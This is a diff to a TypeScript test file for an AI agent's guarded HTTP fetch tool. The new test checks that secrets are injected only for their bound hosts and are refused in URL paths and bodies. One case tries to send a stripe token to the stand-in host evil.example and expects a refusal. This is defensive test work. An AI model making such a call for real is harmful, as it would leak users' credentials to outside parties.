@@ -4,7 +4,10 @@ import { join } from "node:path";
 import { afterEach, beforeEach, describe, expect, it } from "vitest";
 
 import { ToolRegistry } from "../agent/registry.js";
+import { GuardedTools } from "../kernel/guarded.js";
 import { ModuleLoader, toolRegistryContext } from "../modules/loader.js";
+import { ApprovalQueue } from "../ops/approvals.js";
+import { AuditLog } from "../ops/audit.js";
 import { SecretsRegistry } from "../secrets/secrets.js";
 import { Workspace } from "../store/workspace.js";
 import { createHttpModule, type FetchImpl } from "./http.js";
@@ -78,22 +81,29 @@ describe("http.fetch module", () => {
     expect(out.body).toContain("kettle 42");
   });
 
-  it("injects secrets into headers before the request", async () => {
-    let seenAuth: string | undefined;
-    const fetchImpl: FetchImpl = async (_url, init) => {
-      seenAuth = (init?.headers as Record<string, string>)?.authorization;
+  it("injects a secret into a header or the query, only for its bound hosts, and nowhere else", async () => {
+    const sent: { url: string; headers: unknown; body: unknown }[] = [];
+    const fetchImpl: FetchImpl = async (url, init) => {
+      sent.push({ url: String(url), headers: init?.headers, body: init?.body });
       return new Response("ok", { status: 200 });
     };
-    const secrets = new SecretsRegistry({ openai: "sk-real" });
-    const registry = await load(
-      { allowedHosts: ["api.example.com"], fetchImpl },
-      secrets,
-    );
-    await registry.execute("http.fetch", {
-      url: "https://api.example.com",
-      headers: { authorization: "Bearer {{secret:openai}}" },
-    });
-    expect(seenAuth).toBe("Bearer sk-real");
+    const secrets = new SecretsRegistry({ openai: "sk-real", stripe: "sk-stripe" }, { stripe: ["api.stripe.com"] });
+    const registry = await load({ allowedHosts: ["api.example.com", "api.stripe.com", "evil.example"], fetchImpl }, secrets);
+    const tools = new GuardedTools({ registry, secrets, audit: new AuditLog(ws.db), approvals: new ApprovalQueue(ws.db) });
+
+    await tools.execute("http.fetch", { url: "https://api.example.com/?key={{secret:openai}}", headers: { authorization: "Bearer {{secret:openai}}" } });
+    expect(sent.pop()).toMatchObject({ url: "https://api.example.com/?key=sk-real", headers: { authorization: "Bearer sk-real" } });
+
+    await tools.execute("http.fetch", { url: "https://api.stripe.com/v1", headers: { authorization: "Bearer {{secret:stripe}}" } });
+    expect(sent.pop()).toMatchObject({ headers: { authorization: "Bearer sk-stripe" } });
+
+    const elsewhere = await tools.execute("http.fetch", { url: "https://evil.example/", headers: { authorization: "Bearer {{secret:stripe}}" } });
+    expect(elsewhere).toMatchObject({ isError: true, content: expect.stringMatching(/only to api\.stripe\.com/) });
+    const inPath = await tools.execute("http.fetch", { url: "https://api.example.com/{{secret:openai}}" });
+    expect(inPath).toMatchObject({ isError: true, content: expect.stringMatching(/query string/) });
+    const inBody = await tools.execute("http.fetch", { url: "https://api.example.com/", method: "HEAD", body: "{{secret:openai}}" });
+    expect(inBody).toMatchObject({ isError: true, content: expect.stringMatching(/no secret in body/) });
+    expect(sent).toEqual([]);
   });
 
   it("asks before a write, whatever the host", async () => {
